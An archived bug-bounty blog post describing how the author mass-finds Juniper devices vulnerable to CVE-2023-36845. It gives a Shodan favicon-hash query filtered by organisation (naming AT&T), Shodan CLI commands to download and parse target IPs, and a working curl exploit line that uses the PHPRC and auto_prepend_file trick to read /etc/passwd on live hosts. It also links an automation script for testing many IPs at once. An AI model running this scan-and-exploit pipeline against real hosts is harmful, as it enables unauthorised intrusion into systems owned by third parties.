# Automation Hacks

- **Source URL:** https://asbawy.medium.com/automation-hacks-unearthing-a-critical-rce-the-easy-way-ad64f01a06a3?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250830135037/https://asbawy.medium.com/automation-hacks-unearthing-a-critical-rce-the-easy-way-ad64f01a06a3
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/5143 (id 5143)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Automation Hacks: Unearthing a Critical RCE the Easy Way

Good Evening Hunters, Today, I will show you how I can easily report many critical bugs on Hackerone, Bugcrowd, and external programs. My journey began with read of a critical vulnerability in Juniper Networks systems, marked by [CVE-2023–36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845), along with several other CVEs. Here’s a breakdown of the process:

In this article, you’ll learn practical strategies for identifying and exploiting zero-day vulnerabilities as well as harnessing automation to streamline your bug-hunting process.

## Zero-Day Bug Hunting

How to Search for Zero-Day Bugs?

The first step is understanding how to exploit the bug. Familiarize yourself with the CVE and gather more information about the vulnerability. And for this adventure, I brought along my buddy, **Shodan.**

In my case i can seach for Juniper cve by Juniper favicon hash so it’s easy way:

`http.favicon.hash:2141724739`
Now we have a large number of users affected by this bug. Downloading and manually testing all of them wouldn’t be efficient. It takes a long time to filter which ones have bug bounty programs. Instead, I use several filters to narrow down the list.

- I filter by **country** to focus on specific regions.
- I use an **SSL** filter to check for specific domains.
- ***Most importantly***, I filter by **organization**. This allows me to target companies like **AT&T, Comcast**, or others with known bug bounty programs.”

Using Shodan CLI to download relevant data into a file

```
# To Download data in file: Juniper.json.gz
shodan download Juniper 'http.favicon.hash:2141724739 org:"AT&T Services Inc."'
# Extract file and output only ip with port
shodan parse Juniper.json.gz --fields ip_str,port --separator " " | awk '{print $1":"$2}' | anew Juniper_ips
```
Now what? ohh EXPLOIT!!!

Exploiting the Remote Code Execution (RCE) vulnerability. *In this case*, the CURL command

`curl -kv "https://<target>/about.php?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
Now every thing is okay, but i need more fun!

## Automation

Now that we have a file containing numerous IPs that may or may not be vulnerable, manual testing for over 50 IPs is impractical. Automation is the key to success in handling multiple targets efficiently.

For automation purposes, I’ve created a script that tests the CURL command on a list of IPs, generates an output file indicating vulnerability status, and saves the results in a text file. The script can be found on GitHub: [https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845](https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845)

Then save output

This script is essential for managing a large number of targets systematically and ensuring a more effective and timely response to potential vulnerabilities. Remember, in the world of cybersecurity, automation is often the key to success. **Happy hunting!**


## Refrences

[https://vulncheck.com/blog/juniper-cve-2023-36845](https://vulncheck.com/blog/juniper-cve-2023-36845/)

[https://nvd.nist.gov/vuln/detail/CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)
